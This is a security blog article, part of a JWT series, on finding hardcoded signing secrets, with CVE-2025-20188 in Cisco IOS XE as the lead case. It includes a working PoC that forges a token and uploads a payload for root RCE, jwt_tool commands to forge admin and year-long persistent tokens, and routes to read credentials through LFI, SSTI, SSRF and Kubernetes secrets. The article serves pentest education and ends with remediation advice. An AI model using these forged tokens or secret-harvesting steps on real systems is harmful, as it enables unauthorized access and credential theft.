---
title: "JWT, Part 17: Hardcoded Secrets - When the Key Is Sitting in the Source Code"
date: 2026-04-03T20:17:00+03:00
number: 17
tags: ["jwt", "security", "web", "auth"]
summary: "CVE-2025-20188 (CVSS 10.0): eight characters 'notfound' in a Cisco IOS XE Lua script = root RCE on enterprise equipment. 17% of JWT CVEs in 2024-2026 are hardcoded secrets. Where to look: git history, Docker layers, JS bundles, source maps, firmware."
---

**Table of contents:**
- [CVE-2025-20188: Cisco IOS XE, CVSS 10.0](#cve-2025-20188-cisco-ios-xe-cvss-100)
- [17% of JWT CVEs in 2024-2026 are hardcoded secrets](#17-of-jwt-cves-in-2024-2026-are-hardcoded-secrets)
- [How to find hardcoded secrets](#how-to-find-hardcoded-secrets)
- [JS bundles and source maps](#js-bundles-and-source-maps)
- [Quick check for default secrets](#quick-check-for-default-secrets)
- [What to do after finding one](#what-to-do-after-finding-one)
- [Where else to look](#where-else-to-look)
- [Why this will never stop](#why-this-will-never-stop)
- [What's next](#whats-next)

You may have noticed there are no articles 15 and 16. I deliberately chose not to publish them because I felt they weren't deep enough. They may appear later, or they may not. Either way, their absence doesn't affect the rest of this series.

In article 7, I showed how to brute-force JWT secrets with hashcat on a GPU. 150 million attempts per second on an RTX 4090, specialized wordlists, mutation rules. But what if the secret is just the word `notfound` sitting in the source code? Why brute-force something you can just read?

## CVE-2025-20188: Cisco IOS XE, CVSS 10.0

I mentioned this case in the first article. Now the full story.

Cisco IOS XE Wireless Controller. The Out-of-Band AP Image Download feature. A Lua script on the controller reads the JWT key from `/tmp/nginx_jwt_key`. The file doesn't exist (it's supposed to be created by another service during initialization). Fallback:

```lua
secret_read = 'notfound'  -- HARDCODED FALLBACK
```

Eight lowercase characters. hashcat on an RTX 4090 would exhaust all 8-character [a-z] combinations in ~23 minutes (26^8 ≈ 208 billion variants / 150M per second - as I calculated in article 7). But there's nothing to search for - the secret is right there in the Lua script source.

The attacker signs a JWT with this secret, uploads an arbitrary file through the AP Image Download endpoint, and gets root RCE. PoC:

```python
import jwt, time, requests

token = jwt.encode(
    {"reqid": "x", "exp": int(time.time()) + 3600},
    "notfound", algorithm="HS256")

requests.post("https://wlc.corp.local/aparchive/upload",
    cookies={"jwt": token},
    files={"file": ("pwn.tar", open("payload.tar", "rb"))})
```

CVSS 10.0. Unauthenticated RCE on enterprise-grade network equipment. Because of eight characters.

## 17% of JWT CVEs in 2024-2026 are hardcoded secrets

Cisco isn't alone. Stats for 2024-2026: every sixth JWT bug is just a hardcoded secret.

**CVE-2025-30206 (Dpanel, CVSS 9.8)** - Docker visualization panel. JWT secret hardcoded right in the source code on GitHub. Read the code, generate an admin token, get control over the host machine via Docker API.

**CVE-2025-13877 (NocoBase, CVSS 5.6)** - the official `docker-compose.yml` sets `APP_KEY=your-secret-key`. This key is used as the JWT secret. Every default installation following the docs is an open door. CVSS is lower than Cisco and Dpanel because authentication is required for exploitation, but the default key still lets you forge any user's token.

The pattern is always the same: a developer writes a fallback value "in case the environment variable isn't set." The fallback ends up in production. Or a `docker-compose.yml` with defaults gets copied as-is.

## How to find hardcoded secrets

**In git repositories:**

```bash
# trufflehog - scans the entire git history
trufflehog git https://github.com/megabank-example/core-api --only-verified

# gitleaks - fast scanner
gitleaks detect -s /path/to/repo -v
```

trufflehog walks through every commit, including deleted and squashed ones. The secret was in the code, then removed? trufflehog will still find it.

**Warning about `--only-verified`:** this flag sends discovered credentials to real services (AWS, GitHub, Slack API) to verify the secret is live. On a pentest this means: live API calls from your machine, an audit trail on the service side, possible SOC alerts at the client. Only use `--only-verified` when you're explicitly cleared to do so.

**In Docker images:**

```bash
# Metadata: ENV/ARG with secrets in Dockerfile instructions
docker history --no-trunc megabank/core-api

# Native scanning of all layers (800+ detectors)
trufflehog docker --image megabank/core-api

# Or the manual approach for a quick check
docker save megabank/core-api | tar -xO | \
  strings | grep -iE "jwt|secret|signing|key"
```

A Docker image is a stack of layers. Even if the secret is deleted in the final layer, previous layers still contain it. `docker history --no-trunc` shows full Dockerfile instructions, including `ENV JWT_SECRET=...` and `ARG` with default values. `trufflehog docker --image` runs all layers through 800+ detectors - more accurate and faster than manual `strings | grep`.

**In firmware:**

```bash
strings firmware.bin | grep -iE "jwt|secret|key|hmac|signing"
```

**In mobile apps:**

```bash
# APK (Android)
apktool d app.apk
grep -riE "jwt|secret|signing" app/

# IPA (iOS) - after unpacking
strings Payload/App.app/App | grep -iE "jwt|secret"
```

## JS bundles and source maps

SPAs built with React, Angular, or Vue are the most common source of JWT secrets on web engagements. And you don't need repo access for this - just a browser.

Webpack bundles contain all client-side JavaScript, including configuration. A developer writes `process.env.JWT_SECRET` in the code, Webpack replaces it with the real value at build time. Result - the secret in plaintext in `app.bundle.js`.

Source maps in production - send them to Burp Repeater, look for the full source in the response:

```http
GET /static/js/main.chunk.js.map HTTP/2
Host: app.megabank.example
```

In the response, look for the `sources` array - a list of all original source files. Secrets are often in `config.js`, `env.js`, `constants.js`.

Bundles - in the Response tab use search (`Ctrl+F`) for patterns like `jwt`, `secret`, `signing`, `key`:

```http
GET /static/js/main.3a7f2b.bundle.js HTTP/2
Host: app.megabank.example
```

`window.__CONFIG__` and global configs - request the main page and look for `window.__` in the response:

```http
GET / HTTP/2
Host: app.megabank.example
```

What to look for:
- `*.js.map` files - source maps with full source code
- `window.__CONFIG__`, `window.__ENV__` - global configs
- `process.env.*` replaced by Webpack/Vite with real values at build time
- Inline `<script>` tags with configuration in HTML

## Quick check for default secrets

Before hashcat - try the most common secrets first. jwt_tool with the Wallarm wordlist (which we used in article 7):

```bash
python3 jwt_tool.py "$TOKEN" -C -d jwt.secrets.list
```

Or a manual check in Python - no dependencies, no shell interpolation:

```python
import hmac, hashlib, base64, sys

token = sys.argv[1]
parts = token.split('.')
msg = f"{parts[0]}.{parts[1]}".encode()
actual_sig = parts[2]

secrets = [
    "secret", "password", "your-256-bit-secret",
    "notfound", "changeme", "test", "development",
    "your-secret-key", "jwt_secret", "s3cret",
]

for s in secrets:
    sig = base64.urlsafe_b64encode(
        hmac.new(s.encode(), msg,
        hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == actual_sig:
        print(f"FOUND: {s}")
```

```bash
python3 check_secret.py "$TOKEN"
```

`your-256-bit-secret` - the default from jwt.io that developers copy into production. `notfound` - Cisco IOS XE. `changeme` - a classic from .env.example. `your-secret-key` - NocoBase.

Typical framework defaults worth adding to your wordlist:

| Framework | Variable | Default |
|-----------|----------|---------|
| Django | `SECRET_KEY` | `django-insecure-*` (prefix) |
| Laravel | `APP_KEY` | `base64:...` (from .env.example) |
| Spring Boot | `jwt.secret` in `application.yml` | often `secret` or `mySecretKey` |
| Express/Node | `JWT_SECRET` | `shhh`, `secret`, `keyboard cat` |
| Rails | `secret_key_base` | from `credentials.yml.enc` |
| ASP.NET | `Jwt:Key` in `appsettings.json` | `your-256-bit-secret` |

## What to do after finding one

Finding the secret is half the battle. Next steps:

1. **Forge an admin token.** Sign a JWT with `"sub": "admin"`, `"role": "superadmin"`, or whatever the specific application uses
2. **Check all endpoints.** A single secret can grant access to the API, admin panel, and internal services
3. **Cross-environment.** The staging secret often matches production. The one from `.env.development` matches `.env.production`. Check it
4. **Blast radius.** One HMAC secret shared across 50 microservices - compromising one means access to all
5. **Long-lived tokens.** Sign a token with `"exp"` set a year ahead - persistent access, even if they rotate the secret later (if the server doesn't check a revocation list). Ethically debatable, but from a bounty perspective it's solid impact

```bash
# Forge an admin token with jwt_tool
python3 jwt_tool.py "$TOKEN" -T -S hs256 \
  -p "discovered_secret" \
  -pc sub -pv "admin" \
  -pc role -pv "superadmin"
```

## Where else to look

Beyond source code, Docker images, and JS bundles:

- **`.git/` on the web server**: misconfigured nginx/Apache - `/.git/` is accessible - git-dumper reconstructs the entire repository with history. Check `https://app.megabank.example/.git/HEAD` - if it returns `ref: refs/heads/main`, the repo is exposed
- **CI/CD**: GitHub Actions logs, Jenkins `credentials.xml`, GitLab CI variables, `.env` in build artifacts, Terraform state files with secrets in plaintext
- **GitHub search**: `jwt_secret` or `JWT_SECRET` in public repositories
- **Environment variables**: via LFI - `/proc/self/environ`, SSRF, `phpinfo()`, Spring Boot `/actuator/env`, SSTI - `{{config.SECRET_KEY}}`, Node.js debug error pages with `process.env`
- **.env files**: frequently committed to git (`.env`, `.env.production`, `.env.local`)
- **docker inspect**: `docker inspect container_id | grep -i secret`
- **Kubernetes secrets**: `kubectl get secrets -o yaml` - base64, **not** encryption. Default etcd stores secrets in plaintext
- **AWS Parameter Store / Secrets Manager**: via SSRF to the metadata endpoint (article 6)
- **Private keys**: everything above applies to RSA/ECDSA too. PEM files in repositories, JWK with the `"d"` parameter (private exponent), base64-encoded private keys in environment variables. In enterprise environments asymmetric algorithms dominate - leaking the private key means full signature compromise

## Why this will never stop

A developer writes `JWT_SECRET=changeme` in `.env.example`. Someone copies it to `.env` and forgets to change it. A `docker-compose.yml` with `SECRET_KEY=your-secret-key` as the default becomes production. A fallback `|| "secret"` in the code ends up being the only source of the key when the environment variable isn't set.

The right approach:

```bash
# Generate a cryptographically strong secret
python3 -c "import secrets; print(secrets.token_hex(32))"

# Or via openssl
openssl rand -base64 32
```

256 bits from a CSPRNG. Not a human word, not a framework default, not a fallback. RFC 7518 requires HS256 keys to be at least 256 bits. RFC 8725 goes further: the key must come from a cryptographically secure random generator, not a human-readable password (article 7).

And rotation: even a strong key should be changed periodically. Use `kid` for key versioning (article 5) - this lets you rotate keys without invalidating existing tokens.

But right now you can go to GitHub, search for `jwt_secret` in public repositories, and find dozens of working secrets.

## What's next

17 articles about how JWT breaks (well, not quite 17 yet, but let's pretend). The logical question - what instead? In the next article: PASETO (JWT without the alg field), Macaroons (tokens with the superpower of attenuation), server-side sessions, and the hybrid approach of 2026.
